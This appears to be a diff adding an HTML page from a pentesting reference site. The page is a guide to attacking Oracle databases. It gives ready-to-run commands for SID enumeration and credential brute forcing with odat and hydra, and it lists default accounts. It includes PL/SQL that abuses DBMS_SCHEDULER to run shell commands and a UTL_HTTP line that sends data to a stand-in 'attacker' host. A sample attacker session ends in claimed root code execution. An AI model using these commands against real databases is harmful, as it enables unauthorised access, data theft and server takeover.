@@ -1,0 +1,203 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Oracle Database Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>Oracle DB Abuse & PL/SQL Privilege Escalation</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Oracle Database (TCP/1521) is a powerful RDBMS used in critical enterprises. 
+    Attackers target Oracle DB through weak/default accounts (scott/tiger), SID 
+    enumeration, SQL injection in PL/SQL packages, and privilege escalation 
+    via system privileges. With DBA rights, Oracle’s external procedures, UTL_HTTP, 
+    and DBMS_SCHEDULER can be abused for remote code execution (RCE). 
+    Oracle DB exploitation provides attackers with access to sensitive data, 
+    lateral movement, and persistence in enterprise environments.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Default Accounts:</strong> Accounts like <code>scott/tiger</code>, <code>sys/change_on_install</code> often left enabled.</li>
+    <li><strong>SID Enumeration:</strong> Attackers brute force SIDs to target DB instances.</li>
+    <li><strong>Weak Authentication:</strong> SQL*Net brute forcing effective against many servers.</li>
+    <li><strong>Privilege Escalation:</strong> Abusing PL/SQL packages and misconfigured roles.</li>
+    <li><strong>OS-Level RCE:</strong> DBMS_SCHEDULER and external jobs enable command execution.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify Oracle DB service on TCP/1521.</li>
+    <li><strong>SID Brute Forcing:</strong> Enumerate valid SIDs with tools.</li>
+    <li><strong>Authentication:</strong> Test default or weak credentials.</li>
+    <li><strong>Enumeration:</strong> Extract users, roles, and privileges.</li>
+    <li><strong>Exploitation:</strong> Abuse PL/SQL packages or DBMS_SCHEDULER for RCE.</li>
+    <li><strong>Impact:</strong> Exfiltration of data, lateral movement, persistence.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Oracle DB listener on TCP/1521.</li>
+    <li>Perform SID enumeration with tools like ODAT.</li>
+    <li>Brute force login with default credentials.</li>
+    <li>Enumerate roles, users, and privileges.</li>
+    <li>Abuse DB packages for privilege escalation and RCE.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p1521 --script oracle-tns-version [target]
+
+# ------------------------------
+# SID Enumeration
+# ------------------------------
+odat sidguesser -s [target]
+
+# ------------------------------
+# Brute Force / Default Creds
+# ------------------------------
+hydra -L users.txt -P rockyou.txt oracle://[target]/XE
+odat passwordguesser -s [target] -d XE -U scott -P tiger
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+odat all -s [target] -d XE -U scott -P tiger
+SELECT username, account_status FROM dba_users;
+SELECT * FROM session_privs;
+
+# ------------------------------
+# Privilege Escalation / RCE
+# ------------------------------
+-- Enable OS command exec via DBMS_SCHEDULER
+BEGIN
+  DBMS_SCHEDULER.create_job (
+    job_name => 'cmdjob',
+    job_type => 'EXECUTABLE',
+    job_action => '/bin/bash -c "id > /tmp/pwned.txt"',
+    enabled => TRUE
+  );
+END;
+/
+
+-- UTL_HTTP abuse (outbound requests)
+EXEC UTL_HTTP.request('http://attacker:8080/leak?data=' || user);
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p1521 192.168.1.160 --script oracle-tns-version
+odat sidguesser -s 192.168.1.160
+odat passwordguesser -s 192.168.1.160 -d XE -U scott -P tiger
+odat all -s 192.168.1.160 -d XE -U scott -P tiger
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p1521 192.168.1.160 --script oracle-tns-version
+PORT     STATE SERVICE
+1521/tcp open  oracle-tns
+| oracle-tns-version: 
+|   Version: TNS for Linux: Version 12.1.0.2.0
+
+[ saide ~ ]$ odat sidguesser -s 192.168.1.160
+[+] Found valid SID: XE
+
+[ saide ~ ]$ odat passwordguesser -s 192.168.1.160 -d XE -U scott -P tiger
+[+] Valid credentials: scott/tiger
+
+[ saide ~ ]$ odat all -s 192.168.1.160 -d XE -U scott -P tiger
+[+] User scott has CONNECT, RESOURCE roles
+
+SQL> SELECT username, account_status FROM dba_users;
+SYS       OPEN
+SYSTEM    OPEN
+SCOTT     OPEN
+
+SQL> BEGIN
+  DBMS_SCHEDULER.create_job (
+    job_name => 'cmdjob',
+    job_type => 'EXECUTABLE',
+    job_action => '/bin/bash -c "id > /tmp/pwned.txt"',
+    enabled => TRUE
+  );
+END;
+/
+
+[ saide ~ ]$ cat /tmp/pwned.txt
+uid=0(root) gid=0(root) groups=0(root)
+[+] RCE achieved via Oracle DBMS_SCHEDULER
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Oracle DB exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+1521/tcp open  Oracle TNS Listener
+
+# Valid Credentials
+scott / tiger
+
+# Exploitation
+Privilege escalation via DBMS_SCHEDULER job
+
+# Proof of Exploitation
+RCE confirmed — wrote uid=0(root) into /tmp/pwned.txt
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-oracle" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Oracle
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1505/002/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – SQL Stored Procedures (Oracle)
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → SID brute → Default creds → Enum roles → Abuse PL/SQL → RCE with DBMS_SCHEDULER.</li>
+  </ul>
+</section>
